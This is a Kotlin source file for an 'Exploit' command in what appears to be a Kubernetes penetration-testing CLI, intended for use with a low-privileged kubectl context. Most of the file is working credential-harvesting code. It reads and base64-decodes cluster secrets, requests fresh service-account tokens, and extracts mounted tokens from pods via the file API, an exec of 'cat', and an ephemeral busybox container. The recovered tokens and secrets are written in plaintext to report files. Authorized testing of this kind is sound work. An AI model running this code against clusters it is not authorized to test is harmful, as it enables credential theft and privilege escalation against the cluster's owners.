package com.nickcoblentz.kubepentest.commands

import com.fasterxml.jackson.databind.ObjectMapper
import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.core.requireObject
import com.github.ajalt.clikt.parameters.options.flag
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.mordant.rendering.TextColors
import com.nickcoblentz.kubepentest.models.KubePentestContext
import io.fabric8.kubernetes.api.model.EphemeralContainerBuilder
import io.fabric8.kubernetes.api.model.Pod
import io.fabric8.kubernetes.api.model.Secret
import io.fabric8.kubernetes.api.model.SecurityContextBuilder
import io.fabric8.kubernetes.api.model.ServiceAccount
import io.fabric8.kubernetes.api.model.authentication.TokenRequest
import java.io.ByteArrayOutputStream
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.util.*
import kotlin.io.path.absolutePathString


/**
 * Command to attempt exploitation of Kubernetes cluster vulnerabilities.
 */
class Exploit : CliktCommand() {
    override fun help(context: com.github.ajalt.clikt.core.Context) = 
        "${(TextColors.green)("(online)")} Attempts to exploit potential vulnerabilities in the Kubernetes cluster. Uses the all.json file as the source of targets."

    private val config by requireObject<KubePentestContext>()

    /**
     * Writes the results to a text file, CSV file, and Markdown file.
     * 
     * @param baseFilePath The base file path without extension
     * @param textContent The content for the text file
     * @param csvContent The content for the CSV file
     * @param markdownContent The content for the Markdown file
     */
    private fun writeResults(baseFilePath: String, textContent: String, csvContent: String, markdownContent: String) {
        val timestamp = System.currentTimeMillis()
        val textPath = config.securityDirectoryPath("$baseFilePath-$timestamp.txt")
        val csvPath = config.securityDirectoryPath("$baseFilePath-$timestamp.csv")
        val mdPath = config.securityDirectoryPath("$baseFilePath-$timestamp.md")

        Files.writeString(textPath, textContent)
        Files.writeString(csvPath, csvContent)
        Files.writeString(mdPath, markdownContent)


        config.prettyLogger.printlnInfo(
            title = "Results written to",
            message = "Text: ${textPath.absolutePathString()}\nCSV: ${csvPath.absolutePathString()}\nMarkdown: ${mdPath.absolutePathString()}"
        )
    }

    private val secretsOption by option(
        "--secrets",
        help = "Attempt to access mounted secrets and JWT tokens in pods"
    ).flag()

    private val serviceAccountsOption by option(
        "--service-accounts",
        help = "Attempt to access mounted service accounts in pods"
    ).flag()

    private val allOption by option(
        "--all","-a",
        help = "Attempt to access mounted secrets and JWT tokens in pods"
    ).flag()




    override fun run() {

        // Display current kubectl context
        config.prettyLogger.printlnInfo(
            title = "Current kubectl context",
            message = "Name: ${config.k8s.configuration.currentContext.name}, " +
                    "Cluster: ${config.k8s.configuration.currentContext.context.cluster}, " +
                    "User: ${config.k8s.configuration.currentContext.context.user}, " +
                    "Default Namespace: ${config.k8s.configuration.currentContext.context.namespace ?: "default"}"
        )

        // Remind user to set kubectl context to a lower-privileged user
        config.prettyLogger.printlnWarning(
            title = "IMPORTANT",
            message = "Before running this command, ensure your kubectl context is set to a lower-privileged user that you are using to attempt unauthorized access to resources."
        )
        // Ask for confirmation
        print("Do you wish to continue? (y/N): ")
        val response = readLine()?.trim()?.lowercase() ?: "n"

        if (response != "y") {
            config.prettyLogger.printlnInfo(message = "Exploit command aborted.")
            return
        }

        // Check which flags are enabled
        if (secretsOption||allOption) {
            attemptAccessSecrets()
        }
        if (serviceAccountsOption||allOption) {
            attemptAccessServiceAccounts()
        }

    }

    private fun attemptAccessServiceAccounts() {
        config.prettyLogger.printlnInfo(
            title = "Attempting to access service accounts, both mounted in pods and in the cluster",
            message = "This test will attempt to access sensitive information that should be protected by proper RBAC."
        )

        val allJsonPath = config.allJSONFilePath()
        if (!Files.exists(allJsonPath)) {
            config.prettyLogger.printlnError(message = "File ${allJsonPath.absolutePathString()} not found. Run 'dump-cluster' command first.")
            return
        }

        // Parse all.json file
        val resources = config.importExportUtils.deserializeFromFile(allJsonPath.toString())
        config.prettyLogger.printlnInfo(message = "Loaded ${resources.size} resources from ${allJsonPath.absolutePathString()}")

        // Initialize builders for different output formats
        val textBuilder = StringBuilder()
        val csvBuilder = StringBuilder()
        val mdBuilder = StringBuilder()

        // Add headers
        val timestamp = System.currentTimeMillis()

        // Text format headers
        textBuilder.appendLine("# Kubernetes Service Accounts Exploit Test")
        textBuilder.appendLine("# Timestamp: $timestamp")
        textBuilder.appendLine("# Context: ${config.k8s.configuration.currentContext.name}")
        textBuilder.appendLine("# User: ${config.k8s.configuration.currentContext.context.user}")
        textBuilder.appendLine("# Cluster: ${config.k8s.configuration.currentContext.context.cluster}")

        mdBuilder.appendLine("|Type|Namespace|Name|Success|Value|")
        mdBuilder.appendLine("|---|---|---|---|---|")

        // CSV format headers
        csvBuilder.appendLine("Type,Namespace,Name,Success,Value")





        // Filter for Secret resources
        val serviceAccounts = resources.filter { it.kind == "ServiceAccount" }

        serviceAccounts.forEach { serviceAccountResource ->

            var liveServiceAccount : ServiceAccount? = null
            var liveServiceAccountToken : TokenRequest? = null
            if(serviceAccountResource.metadata.namespace.isNullOrBlank()) {
                try {
                    liveServiceAccount =
                        config.k8s.serviceAccounts().withName(serviceAccountResource.metadata.name).get()
                }
                catch (e: Exception) {

                }
                try {
                    liveServiceAccountToken =
                        config.k8s.serviceAccounts().withName(serviceAccountResource.metadata.name).tokenRequest()
                }
                catch(e: Exception) {

                }
            }
            else {
                try {
                    liveServiceAccount =
                        config.k8s.serviceAccounts().inNamespace(serviceAccountResource.metadata.namespace)
                            .withName(serviceAccountResource.metadata.name).get()
                } catch(e: Exception) {}
                try {
                    liveServiceAccountToken = config.k8s.serviceAccounts().inNamespace(serviceAccountResource.metadata.namespace).withName(serviceAccountResource.metadata.name).tokenRequest()
                } catch(e: Exception) {}
            }
            if(liveServiceAccountToken!=null) {
                val token = liveServiceAccountToken.status.token
                if(!token.isNullOrBlank()) {
                    // Text format
                    textBuilder.appendLine("Found live service account token for ${serviceAccountResource.metadata.name} in namespace ${serviceAccountResource.metadata.namespace}")
                    textBuilder.appendLine("created a new token: $token")

                    // CSV format
                    csvBuilder.appendLine("ServiceAccount,${serviceAccountResource.metadata.namespace},${serviceAccountResource.metadata.name},true,\"$token\"")
                    mdBuilder.appendLine("|ServiceAccount|${serviceAccountResource.metadata.namespace}|${serviceAccountResource.metadata.name}|true|$token|")


                }
            }


        }

        val pods = resources.filter { it.kind == "Pod" }
        val threadList = mutableListOf<Thread>()
        pods.forEach { podResource ->
            val monitorThread = Thread.ofVirtual().name("${podResource.metadata.namespace}-${podResource.metadata.name}-VirtualThread").start() {
                var pod : Pod? = null
                try {
                    pod = config.k8s.pods().inNamespace(podResource.metadata.namespace).withName(podResource.metadata.name)
                        .get()
                } catch(e: Exception) {}
                pod?.spec?.containers?.forEach { container ->
                    var receivedToken = false
                    try {
                        val tokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"
                        val token = config.k8s.pods()
                            .inNamespace(podResource.metadata.namespace)
                            .withName(podResource.metadata.name)
                            .inContainer(container.name)
                            .file(tokenPath)
                            .read()
                            .readAllBytes()
                            .toString(StandardCharsets.UTF_8)

                        if (token.isNotBlank()) {
                            // Text format
                            textBuilder.appendLine("Through CP: Found service account token in pod ${podResource.metadata.name} in namespace ${podResource.metadata.namespace}, container ${container.name}:")
                            textBuilder.appendLine(token)
                            textBuilder.appendLine()

                            // CSV format
                            csvBuilder.appendLine("Pod,${podResource.metadata.namespace},${podResource.metadata.name},true,\"${token.replace("\"", "\"\"")}\"")
                            mdBuilder.appendLine("|Pod|${podResource.metadata.namespace}|${podResource.metadata.name}|true|${token.replace("\"", "\"\"")}|")


                            receivedToken = true
                        }
                    } catch (e: Exception) {
                        // First approach failed, try executing the cat command inside the pod
                        config.prettyLogger.printlnInfo(
                            title = "Info",
                            message = "Could not access token in pod ${podResource.metadata.name}, container ${container.name} using file API: ${e.message}."
                        )
                    }

                    if (!receivedToken) {
                        try {
                            val tokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"
                            val outputStream = ByteArrayOutputStream()
                            val errorStream = ByteArrayOutputStream()

                            val execWatch = config.k8s.pods()
                                .inNamespace(podResource.metadata.namespace)
                                .withName(podResource.metadata.name)
                                .inContainer(container.name)
                                .writingOutput(outputStream)
                                .writingError(errorStream)
                                .exec("cat", tokenPath)

                            // Give the command some time to complete
                            Thread.sleep(250)
                            execWatch.close()

                            val execOutput = outputStream.toString(StandardCharsets.UTF_8.name()).trim()
                            if (execOutput.isNotBlank()) {
                                // Text format
                                textBuilder.appendLine("Through EXEC: Found service account token in pod ${podResource.metadata.name} in namespace ${podResource.metadata.namespace}, container ${container.name} (using exec):")
                                textBuilder.appendLine(execOutput)
                                textBuilder.appendLine()

                                // CSV format
                                csvBuilder.appendLine("Pod,${podResource.metadata.namespace},${podResource.metadata.name},true,\"${execOutput.replace("\"", "\"\"")}\"")

                            } else {
                                errorStream.toString(StandardCharsets.UTF_8.name()).trim().let { error ->
                                    config.prettyLogger.printlnInfo(message = "EXEC failed in pod ${podResource.metadata.name} in namespace ${podResource.metadata.namespace}, container ${container.name}\n$error")
                                }
                            }

                        } catch (execException: Exception) {
                            // Ignore errors - this is expected for pods where we don't have access
                            if (config.verbose) {
                                config.prettyLogger.printlnInfo(
                                    title = "Info",
                                    message = "Could not access token in pod ${podResource.metadata.name}, container ${container.name} using exec: ${execException.message}"
                                )
                            }
                        }
                    }

                    // If both previous methods failed, try using an ephemeral pod
            //                    if (!receivedToken) {
            //                        try {
            //                            val tokenFromEphemeralPod = tryAccessTokenWithEphemeralPod(pod, container, resultsBuilder)
            //                            if (tokenFromEphemeralPod.isNotBlank()) {
            //                                resultsBuilder.appendLine("Through EPHEMERAL POD: Found service account token in pod ${podResource.metadata.name} in namespace ${podResource.metadata.namespace}, container ${container.name}\n$tokenFromEphemeralPod")
            //                                receivedToken = true
            //                            }
            //                        } catch (ephemeralPodException: Exception) {
            //                            // Ignore errors - this is expected for pods where we don't have access
            //                            if (config.verbose) {
            //                                config.prettyLogger.printlnInfo(
            //                                    title = "Info",
            //                                    message = "Could not access token in pod ${podResource.metadata.name}, container ${container.name} using ephemeral pod: ${ephemeralPodException.message}"
            //                                )
            //                            }
            //                        }
            //                    }
                }
            }
            threadList.add(monitorThread)
        }

        threadList.forEach { it.join() }

        // Write results to files
        writeResults(
            "exploit-serviceaccounts",
            textBuilder.toString(),
            csvBuilder.toString(),
            mdBuilder.toString()
        )

    }

    /**
     * Attempts to access a service account token by creating an ephemeral pod that attaches to the target pod
     * and accesses the token file.
     * 
     * @param podResource The target pod resource
     * @param container The target container
     * @param textBuilder StringBuilder to append text results to
     * @return true if a token was successfully retrieved, false otherwise
     */
    private fun tryAccessTokenWithEphemeralPod(podResource: Pod, container: io.fabric8.kubernetes.api.model.Container, textBuilder: StringBuilder): String {
        val podNamespace = podResource.metadata.namespace
        val podName = podResource.metadata.name
        val containerName = container.name
        val tokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"

        config.prettyLogger.printlnInfo(
            title = "Ephemeral Pod",
            message = "Attempting to access token in pod $podName in namespace $podNamespace, container $containerName using an ephemeral pod"
        )

        // Create a unique name for the ephemeral pod
        val ephemeralPodName = "token-extractor-${System.currentTimeMillis()}"


        val ephemeralContainer = EphemeralContainerBuilder()
            .withName(ephemeralPodName)
            .withImage("busybox:latest")
            .withCommand("cat", "/var/run/secrets/kubernetes.io/serviceaccount/token")
            .withStdin(true)
            .withTty(true)
            .withSecurityContext(
                SecurityContextBuilder().withReadOnlyRootFilesystem(false).build()
            ) // Ensure we can run commands
            .build()

        podResource.spec.ephemeralContainers.add(ephemeralContainer)
        try {
            val createdPod = config.k8s.pods()
            .inNamespace(podNamespace)
            .withName(podName)
            .patch(podResource);

            // Wait for the pod to complete
            var podCompleted = false
            var attempts = 0
            val maxAttempts = 10

            while (!podCompleted && attempts < maxAttempts) {
                Thread.sleep(2000)
                attempts++

                val podStatus = config.k8s.pods().inNamespace(podNamespace).withName(ephemeralPodName).get()?.status?.phase
                if (podStatus == "Succeeded" || podStatus == "Failed") {
                    podCompleted = true
                }
            }

            // Get the logs from the ephemeral pod
            val logs = config.k8s.pods()
                .inNamespace(podNamespace)
                .withName(ephemeralPodName)
                .log

            // Check if the logs contain a token
            if (logs.isNotBlank() && !logs.contains("No token found")) {
                textBuilder.appendLine("Through EPHEMERAL POD: Found service account token in pod $podName in namespace $podNamespace, container $containerName:")
                textBuilder.appendLine(logs)
                textBuilder.appendLine()
                return logs
            }


        } finally {
            // Clean up the ephemeral pod
            try {
                config.k8s.pods().inNamespace(podNamespace).withName(ephemeralPodName).delete()
                if (config.verbose) {
                    config.prettyLogger.printlnInfo(
                        title = "Cleanup",
                        message = "Deleted ephemeral pod $ephemeralPodName"
                    )
                }
            } catch (e: Exception) {
                if (config.verbose) {
                    config.prettyLogger.printlnWarning(
                        title = "Warning",
                        message = "Failed to delete ephemeral pod $ephemeralPodName: ${e.message}"
                    )
                }
            }
        }
        return ""
    }

    private fun attemptAccessSecrets() {
        config.prettyLogger.printlnInfo(
            title = "Attempting to access secrets",
            message = "This test will attempt to access sensitive information that should be protected by proper RBAC."
        )


        val allJsonPath = config.allJSONFilePath()
        if (!Files.exists(allJsonPath)) {
            config.prettyLogger.printlnError(message = "File ${allJsonPath.absolutePathString()} not found. Run 'dump-cluster' command first.")
            return
        }

        // Parse all.json file
        val resources = config.importExportUtils.deserializeFromFile(allJsonPath.toString())
        config.prettyLogger.printlnInfo(message = "Loaded ${resources.size} resources from ${allJsonPath.absolutePathString()}")

        // Initialize builders for different output formats
        val textBuilder = StringBuilder()
        val csvBuilder = StringBuilder()
        val mdBuilder = StringBuilder()

        // Add headers
        val timestamp = System.currentTimeMillis()

        // Text format headers
        textBuilder.appendLine("# Kubernetes Secrets Exploit Test")
        textBuilder.appendLine("# Timestamp: $timestamp")
        textBuilder.appendLine("# Context: ${config.k8s.configuration.currentContext.name}")
        textBuilder.appendLine("# User: ${config.k8s.configuration.currentContext.context.user}")
        textBuilder.appendLine("# Cluster: ${config.k8s.configuration.currentContext.context.cluster}")

        // CSV format headers
        csvBuilder.appendLine("Namespace,Name,Key,Value")

        // Markdown format headers
        mdBuilder.appendLine("# Kubernetes Secrets Exploit Test")
        mdBuilder.appendLine("## Test Information")
        mdBuilder.appendLine("- **Timestamp**: $timestamp")
        mdBuilder.appendLine("- **Context**: ${config.k8s.configuration.currentContext.name}")
        mdBuilder.appendLine("- **User**: ${config.k8s.configuration.currentContext.context.user}")
        mdBuilder.appendLine("- **Cluster**: ${config.k8s.configuration.currentContext.context.cluster}")
        mdBuilder.appendLine()
        mdBuilder.appendLine("## Results")
        mdBuilder.appendLine("| Namespace | Name | Key | Value |")
        mdBuilder.appendLine("|-----------|------|-----|-------|")

        // Filter for Secret resources
        val secrets = resources.filter { it.kind == "Secret" }


        secrets.forEach { secretResource ->
            var liveSecret : Secret? = null
            try {
                 liveSecret = config.k8s.secrets().inNamespace(secretResource.metadata.namespace)
                    .withName(secretResource.metadata.name).get()
            } catch(e: Exception) {}

            if (liveSecret != null) {
                // Text format
                textBuilder.appendLine("Found live secret: ${secretResource.metadata.name} in namespace ${secretResource.metadata.namespace}")
                textBuilder.appendLine("  Secret keys: ${liveSecret.data?.keys?.joinToString(", ")}")

                liveSecret.data?.forEach { (key, value) ->
                    try {
                        val decodedValue = String(Base64.getDecoder().decode(value))
                        // Text format
                        textBuilder.appendLine("  Key: $key, Value: $decodedValue")

                        // CSV format
                        csvBuilder.appendLine("${secretResource.metadata.namespace},${secretResource.metadata.name},${key},\"${decodedValue.replace("\"", "\"\"")}\"")

                        // Markdown format
                        val truncatedValue = if (decodedValue.length > 30) "${decodedValue.take(30)}..." else decodedValue
                        mdBuilder.appendLine("| ${secretResource.metadata.namespace} | ${secretResource.metadata.name} | $key | `$truncatedValue` |")
                    } catch (e: Exception) {
                        // Text format
                        textBuilder.appendLine("  Key: $key, Value: $value\nError:  ${e.message}")

                        // CSV format
                        csvBuilder.appendLine("${secretResource.metadata.namespace},${secretResource.metadata.name},${key},\"Error: ${e.message?.replace("\"", "\"\"")}\"")

                        // Markdown format
                        mdBuilder.appendLine("| ${secretResource.metadata.namespace} | ${secretResource.metadata.name} | $key | Error: ${e.message} |")
                    }
                }
            }
        }

        // Write results to files
        writeResults(
            "exploit-secrets",
            textBuilder.toString(),
            csvBuilder.toString(),
            mdBuilder.toString()
        )
    }
}
